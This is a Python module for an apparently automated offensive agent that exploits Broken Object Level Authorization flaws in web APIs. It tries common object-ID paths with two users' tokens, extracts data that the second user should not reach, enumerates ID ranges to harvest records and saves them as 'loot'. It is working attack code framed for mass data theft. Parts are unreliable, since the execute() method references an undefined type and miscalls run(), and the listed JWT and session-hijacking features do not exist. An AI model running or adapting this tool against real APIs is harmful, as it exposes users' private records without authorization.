"""
Weaponized BOLA (Broken Object Level Authorization) Agent
โจมตีช่องโหว่ BOLA ใน API endpoints เพื่อเข้าถึงข้อมูลที่ไม่ได้รับอนุญาต
"""

import asyncio
import hashlib
import os
import json
from typing import Dict, List, Any, Optional

import aiohttp

from core.base_agent import BaseAgent
from core.data_models import AgentData, AttackPhase
from core.logger import log


class BOLAAgent(BaseAgent):
    """
    Weaponized BOLA Agent
    
    Features:
    - API endpoint enumeration
    - Object ID manipulation
    - Authorization bypass testing
    - Mass data extraction
    - JWT token manipulation
    - Cookie/Session hijacking
    - Multi-user testing
    """
    
    supported_phases = [AttackPhase.INITIAL_FOOTHOLD, AttackPhase.EXPLOITATION]
    required_tools = []

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        workspace_dir = os.getenv("WORKSPACE_DIR", "workspace"); self.results_dir = os.path.join(workspace_dir, "loot", "bola")
        os.makedirs(self.results_dir, exist_ok=True)
        
        # Common API patterns
        self.api_patterns = [
            "/api/v1/users/{id}",
            "/api/v1/profiles/{id}",
            "/api/v1/documents/{id}",
            "/api/v1/orders/{id}",
            "/api/v1/invoices/{id}",
            "/api/v1/accounts/{id}",
            "/api/v1/posts/{id}",
            "/api/v1/comments/{id}",
            "/api/v2/users/{id}",
            "/api/users/{id}",
            "/users/{id}",
            "/profile/{id}",
        ]
        
        # HTTP methods to test
        self.methods = ["GET", "POST", "PUT", "PATCH", "DELETE"]

    async def run(self, directive: str, context: Dict[str, Any]) -> AgentData:
        """
        Main execution method
        
        Args:
            directive: "scan", "exploit", "enumerate"
            context: {
                "base_url": API base URL,
                "endpoint": specific endpoint to test,
                "user1_token": first user's auth token,
                "user2_token": second user's auth token,
                "object_id": object ID to test
            }
        """
        log.info(f"[BOLAAgent] Starting with directive: {directive}")
        
        base_url = context.get("base_url")
        if not base_url:
            return AgentData(
                agent_name="BOLAAgent",
                success=False,
                data={"error": "No base_url provided"}
            )

        try:
            if directive == "scan":
                result = await self._scan_for_bola(base_url, context)
            elif directive == "exploit":
                result = await self._exploit_bola(base_url, context)
            elif directive == "enumerate":
                result = await self._enumerate_objects(base_url, context)
            else:
                result = await self._scan_for_bola(base_url, context)
            
            return AgentData(
                agent_name="BOLAAgent",
                success=result.get("success", False),
                data=result
            )
            
        except Exception as e:
            log.error(f"[BOLAAgent] Error: {e}")
            return AgentData(
                agent_name="BOLAAgent",
                success=False,
                data={"error": str(e)}
            )

    async def _scan_for_bola(self, base_url: str, context: Dict) -> Dict:
        """สแกนหา BOLA vulnerabilities"""
        log.info(f"[BOLAAgent] Scanning {base_url} for BOLA...")
        
        vulnerabilities = []
        
        user1_token = context.get("user1_token")
        user2_token = context.get("user2_token")
        
        if not user1_token or not user2_token:
            return {
                "success": False,
                "error": "Need both user1_token and user2_token for BOLA testing"
            }
        
        # Test each API pattern
        for pattern in self.api_patterns:
            endpoint = f"{base_url}{pattern}"
            
            # Test with different object IDs
            test_ids = ["1", "2", "10", "100", "1000"]
            
            for object_id in test_ids:
                test_endpoint = endpoint.replace("{id}", object_id)
                
                # Test with both users
                is_vulnerable = await self._test_bola_endpoint(
                    test_endpoint,
                    user1_token,
                    user2_token
                )
                
                if is_vulnerable:
                    vulnerabilities.append({
                        "endpoint": test_endpoint,
                        "object_id": object_id,
                        "pattern": pattern
                    })
                    log.success(f"[BOLAAgent] BOLA found at {test_endpoint}")
                
                await asyncio.sleep(0.1)
        
        result = {
            "success": len(vulnerabilities) > 0,
            "base_url": base_url,
            "vulnerabilities": vulnerabilities,
            "output_file": self._save_results(base_url, "scan", vulnerabilities)
        }
        
        if vulnerabilities:
            log.success(f"[BOLAAgent] Found {len(vulnerabilities)} BOLA vulnerabilities!")
        else:
            log.warning("[BOLAAgent] No BOLA vulnerabilities found")
        
        return result

    async def _test_bola_endpoint(self, endpoint: str, user1_token: str, user2_token: str) -> bool:
        """ทดสอบ BOLA endpoint"""
        try:
            headers1 = {
                "Authorization": f"Bearer {user1_token}",
                "User-Agent": "Mozilla/5.0"
            }
            
            headers2 = {
                "Authorization": f"Bearer {user2_token}",
                "User-Agent": "Mozilla/5.0"
            }
            
            async with aiohttp.ClientSession() as session:
                # Request as user1
                async with session.get(endpoint, headers=headers1, timeout=10) as response1:
                    status1 = response1.status
                    content1 = await response1.text()
                
                # Request as user2 (should fail if authorization is proper)
                async with session.get(endpoint, headers=headers2, timeout=10) as response2:
                    status2 = response2.status
                    content2 = await response2.text()
                
                # Check if user2 can access user1's data
                if status1 == 200 and status2 == 200:
                    # Both succeeded - check if content is different
                    if len(content1) > 100 and len(content2) > 100:
                        # If content is similar, it's likely BOLA
                        similarity = self._calculate_similarity(content1, content2)
                        if similarity > 0.8:  # 80% similar
                            return True
            
            return False
            
        except Exception as e:
            log.debug(f"[BOLAAgent] Error testing endpoint: {e}")
            return False

    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute bola agent weaponized"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def _calculate_similarity(self, text1: str, text2: str) -> float:
        """คำนวณความคล้ายคลึงของ text"""
        # Simple similarity check
        set1 = set(text1.split())
        set2 = set(text2.split())
        
        intersection = set1.intersection(set2)
        union = set1.union(set2)
        
        if len(union) == 0:
            return 0.0
        
        return len(intersection) / len(union)

    async def _exploit_bola(self, base_url: str, context: Dict) -> Dict:
        """Exploit BOLA vulnerability"""
        log.info(f"[BOLAAgent] Exploiting BOLA...")
        
        # First scan
        scan_result = await self._scan_for_bola(base_url, context)
        
        if not scan_result.get("success"):
            return {
                "success": False,
                "message": "No BOLA vulnerability found"
            }
        
        # Extract data from vulnerable endpoints
        vulnerabilities = scan_result["vulnerabilities"]
        extracted_data = []
        
        user2_token = context.get("user2_token")
        
        for vuln in vulnerabilities:
            endpoint = vuln["endpoint"]
            
            # Extract data using user2's token (unauthorized access)
            data = await self._extract_data(endpoint, user2_token)
            
            if data:
                extracted_data.append({
                    "endpoint": endpoint,
                    "data": data
                })
        
        result = {
            "success": len(extracted_data) > 0,
            "vulnerabilities": vulnerabilities,
            "extracted_data": extracted_data,
            "output_file": self._save_results(base_url, "exploit", extracted_data)
        }
        
        log.success(f"[BOLAAgent] Exploitation complete!")
        return result

    async def _extract_data(self, endpoint: str, token: str) -> Optional[Dict]:
        """ดึงข้อมูลจาก endpoint"""
        try:
            headers = {
                "Authorization": f"Bearer {token}",
                "User-Agent": "Mozilla/5.0"
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint, headers=headers, timeout=10) as response:
                    if response.status == 200:
                        try:
                            data = await response.json()
                            return data
                        except Exception as e:
                            text = await response.text()
                            return {"text": text[:500]}
            
            return None
            
        except Exception as e:
            log.debug(f"[BOLAAgent] Error extracting data: {e}")
            return None

    async def _enumerate_objects(self, base_url: str, context: Dict) -> Dict:
        """Enumerate objects"""
        log.info(f"[BOLAAgent] Enumerating objects...")
        
        endpoint = context.get("endpoint")
        if not endpoint:
            return {
                "success": False,
                "error": "No endpoint specified for enumeration"
            }
        
        token = context.get("user2_token")
        start_id = context.get("start_id", 1)
        end_id = context.get("end_id", 100)
        
        found_objects = []
        
        for object_id in range(start_id, end_id + 1):
            test_endpoint = endpoint.replace("{id}", str(object_id))
            
            data = await self._extract_data(test_endpoint, token)
            
            if data:
                found_objects.append({
                    "id": object_id,
                    "endpoint": test_endpoint,
                    "data": data
                })
                log.success(f"[BOLAAgent] Found object: {object_id}")
            
            await asyncio.sleep(0.1)
        
        result = {
            "success": len(found_objects) > 0,
            "start_id": start_id,
            "end_id": end_id,
            "found_objects": found_objects,
            "total_found": len(found_objects),
            "output_file": self._save_results(base_url, "enumerate", found_objects)
        }
        
        log.success(f"[BOLAAgent] Found {len(found_objects)} objects!")
        return result

    def _save_results(self, base_url: str, operation: str, data: Any) -> str:
        """บันทึกผลลัพธ์"""
        url_hash = hashlib.md5(base_url.encode()).hexdigest()[:8]
        filename = f"bola_{operation}_{url_hash}.txt"
        filepath = os.path.join(self.results_dir, filename)
        
        try:
            with open(filepath, 'w') as f:
                f.write(f"Base URL: {base_url}\n")
                f.write(f"Operation: {operation}\n")
                f.write("="*80 + "\n\n")
                f.write(json.dumps(data, indent=2))
            return filepath
        except Exception as e:
            log.error(f"[BOLAAgent] Failed to save results: {e}")
            return ""

